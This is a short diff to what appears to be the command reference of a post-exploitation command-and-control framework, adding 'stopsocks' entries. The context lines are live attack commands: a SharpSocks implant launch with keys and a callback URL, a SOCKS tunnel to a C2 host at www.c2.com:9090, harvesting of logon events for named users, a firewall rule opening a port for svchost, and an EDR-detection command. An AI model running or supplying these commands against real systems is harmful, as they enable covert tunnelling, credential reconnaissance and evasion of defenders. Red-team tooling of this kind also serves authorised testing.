@@ -225,6 +225,7 @@ stopdaisy
 * Socks:
 =========
 sharpsocks
+stopsocks
 run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -url2 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -c raFAdgVujTHBwcvMuRFYgKHqp -k fFaKiMspoTWHPbu3PvUNvpzTkuq+VKDp+h1X79q3gXQ= -s https://10.10.10.1 -b 5000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken
 
 * Bloodhound:
@@ -477,6 +478,7 @@ get-injectedthread
 get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
 send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
 sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
+stopsocks
 netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\\windows\\system32\\svchost.exe" protocol=TCP localport=80 profile=Domain
 reversedns 10.0.0.1
 invoke-edrchecker
